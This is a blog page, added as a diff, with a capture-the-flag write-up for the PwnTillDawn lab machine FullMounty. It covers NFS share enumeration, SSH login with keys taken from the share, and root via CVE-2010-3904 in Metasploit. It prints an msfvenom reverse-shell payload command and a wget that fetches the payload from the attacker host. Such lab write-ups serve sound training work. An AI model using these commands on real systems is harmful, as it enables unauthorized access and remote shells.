@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>PwnTillDawn - FullMounty Write-Up | JLowborn Cybersecurity Blog</title>
+	<meta name="description"
+		content="FullMounty (10.150.150.134)">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/2024/07/11/pwntilldawn-fullmounty.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="JLowborn Cybersecurity Blog"
+		href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css"
+		integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">
+
+	<!-- Google Fonts -->
+	
+	<link href="//fonts.googleapis.com/css2?family=Playfair+Display:400,700 T+Sans:400,700,700italic,400italic" rel="stylesheet"
+		type="text/css">
+	
+</head>
+  <body>
+    <header class="site-header">
+	<div class="branding">
+		
+		<h1 class="site-title">
+			<a href="/">JLowborn Cybersecurity Blog</a>
+		</h1>
+	</div>
+	<nav class="site-nav">
+		<ul>
+			
+			
+			
+			
+			
+			<li>
+				<a class="page-link" href="/curriculum/">
+					Curriculum
+				</a>
+			</li>
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			<!-- Social icons from Font Awesome, if enabled  -->
+			
+
+
+<li>
+	<a href="mailto:wjunior50@gmail.com" title="Email">
+		<i class="fas fa-fw fa-envelope"></i>
+	</a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<li>
+	<a href="https://github.com/jlowborn" title="Follow on GitHub">
+		<i class="fab fa-fw fa-github"></i>
+	</a>
+</li>
+
+
+
+
+
+
+
+<li>
+	<a href="https://www.linkedin.com/in/jlowborn/" title="Follow on LinkedIn">
+		<i class="fab fa-fw fa-linkedin"></i>
+	</a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            <!-- Search bar -->
+            
+		</ul>
+	</nav>
+
+</header>
+
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">PwnTillDawn - FullMounty Write-Up</h1>
+    
+    <p class="meta">
+      July 11, 2024
+      
+    </p>
+  </header>
+  <section class="post-content"><h1 id="fullmounty-10150150134">FullMounty (10.150.150.134)</h1>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/1.png" alt="" /></p>
+
+<h2 id="network-scanning">Network Scanning</h2>
+
+<p>The target machine uses Linux and has a total of 3 flags. We’ll start by scanning the machine as usual.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sV -sC 10.150.150.134 -oN nmap.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/2.png" alt="" /></p>
+
+<p>We have some interesting results including ports <code class="language-plaintext highlighter-rouge">111</code>, <code class="language-plaintext highlighter-rouge">2049</code> and <code class="language-plaintext highlighter-rouge">8089</code>. Personally, I don’t always check for SSH unless I really feel there’s something useful on it, as most of the time it’s a dead end.</p>
+
+<h2 id="exploring-nfs-share">Exploring NFS Share</h2>
+
+<p>NFS is a protocol that is used to share files between different hosts and, when misconfigured, can be used to upload malicious files and even root machines. Let’s list this share to see what’s inside.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>showmount -e 10.150.150.134
+</code></pre></div></div>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/3.png" alt="" /></p>
+
+<p>There’s only one share available on <code class="language-plaintext highlighter-rouge">/srv/exportnfs</code>, which we can try to mount on our machine. For this we’ll create a new folder, and use <code class="language-plaintext highlighter-rouge">mount</code> to access the contents of the share.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir nfs
+sudo mount -t nfs -o vers=3,nolock 10.150.150.134:/srv/exportnfs ./nfs
+</code></pre></div></div>
+
+<p>We can access the share and list it’s contents using <code class="language-plaintext highlighter-rouge">ls -la</code>, it’s important to <strong>always</strong> use the <code class="language-plaintext highlighter-rouge">-a</code> flag as you can easily miss hidden files without it.</p>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/4.png" alt="" /></p>
+
+<p>After copying the files, don’t forget to <code class="language-plaintext highlighter-rouge">sudo umount</code> the folder.</p>
+
+<h2 id="connecting-through-ssh">Connecting Through SSH</h2>
+
+<p>We’ve achieved the first flag that’s inside the <code class="language-plaintext highlighter-rouge">FLAG49</code>, together with SSH key files. We can’t really use a key without a user, can we? Fortunately for us <code class="language-plaintext highlighter-rouge">id_rsa.pub</code> file contains a username that we can use.</p>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/5.png" alt="" /></p>
+
+<p>We can now try to SSH into the machine using this key. This step really took me a long time to figure out as the machine uses a legacy SSH version, which requires some special flags in order to perform a successful connection.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -oHostKeyAlgorithms=+ssh-rsa -i id_rsa deadbeef@10.150.150.134
+</code></pre></div></div>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/6.png" alt="" /></p>
+
+<p>Soon after connecting to the target machine, we can list out the files and discover the next 2 flags in the same folder, but only one of them is readable by our current user which is <code class="language-plaintext highlighter-rouge">FLAG50</code>, the other one requires root privileges.</p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>This step is quite tricky, as due to how old the machine is, there’s a couple of different methods, some are easier than others. We can use <a href="https://github.com/The-Z-Labs/linux-exploit-suggester">Linux Exploit Suggester</a> to find out different methods. The more obvious being Dirty Cow, this can be seen by verifying the kernel and OS version.</p>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/7.png" alt="" /></p>
+
+<p>The real problem is that the machine doesn’t have a compiler installed, so you’ll have to compile the exploit externally and upload it to the target, which wouldn’t be a problem if wasn’t for the fact that it requires the same OS version, and nobody even remember that Ubuntu 10.04 even existed, neither there’s a docker container available. The alternative is to use Metasploit modules which is simpler, so we’ll stick to that.</p>
+
+<p>If you decide to use <code class="language-plaintext highlighter-rouge">linux-exploit-suggester</code>, you’ve probably seen that CVE-2010-3904 is listed as a highly probable exploit.</p>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/8.png" alt="" /></p>
+
+<p>By Googling it, we can see Metasploit has a module for this vulnerability, which we can use easily, and it also tells us that the exploit has been tested on Ubuntu 10.04 with the exact same kernel version we’re working on, that’s great!</p>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/9.png" alt="" /></p>
+
+<p>As this is a local exploit, we’ll use <code class="language-plaintext highlighter-rouge">msfvenom</code> to create our meterpreter reverse shell and before uploading it to the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.66.66.230 lport=1337 -f elf -o reverse
+</code></pre></div></div>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/10.png" alt="" /></p>
+
+<p>Luckily we have access to <code class="language-plaintext highlighter-rouge">wget</code> in the target machine, so we’ll be using python to transfer the binary with the command <code class="language-plaintext highlighter-rouge">python -m http.server</code> and use it to transfer the malicious binary.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget -o- http://10.66.66.230:8000/reverse
+</code></pre></div></div>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/11.png" alt="" /></p>
+
+<p>Now, back to our machine, we’ll start Metasploit and use the <code class="language-plaintext highlighter-rouge">multi/handler</code> module to listen for connections from our previous uploaded binary.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo msfconsole
+</code></pre></div></div>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/12.png" alt="" /></p>
+
+<p>Now let’s go back to the target machine and run our binary.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod +x reverse
+./reverse
+</code></pre></div></div>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/13.png" alt="" /></p>
+
+<p>Now, I know how tempting is to explore the new openly shell, but we’ll just <code class="language-plaintext highlighter-rouge">bg</code> so this session will be sent to the background, as we’ll run our privilege escalation exploit.</p>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/14.png" alt="" /></p>
+
+<p>And now we just run the exploit and profit!</p>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/15.png" alt="" /></p>
+
+<p>I’ve used this method because I really think it’s faster than creating a VM with the specific OS version and compiling the exploit by hand. Besides, Metasploit can do the heavy lifting for us, no need to reinvent the wheel.</p>
+
+<p><img src="/assets/img/post/pwntilldawn_fullmounty/16.png" alt="" /></p>
+
+<p>After typing <code class="language-plaintext highlighter-rouge">shell</code>, just use <code class="language-plaintext highlighter-rouge">/bin/bash -i</code> for an interactive shell and print out the <code class="language-plaintext highlighter-rouge">FLAG51</code> file, voilá!</p>
+
+<p>I really had fun playing this challenge, it taught me how to adapt, as understanding sometimes things won’t go so smoothly as expected, it’s important to understand how different tools can be used for the same job.</p>
+</section>
+  
+
+</article>
+
+<!-- Disqus -->
+
+
+<!-- Post navigation -->
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+<script src="/assets/js/typewriter.js"></script>
+
+
+<footer class="site-footer">
+	<p class="text"><i>"The world is full of fascinating problems waiting to be solved."</i>
+</p>
+</footer>
+
+
+  </body>
+</html>
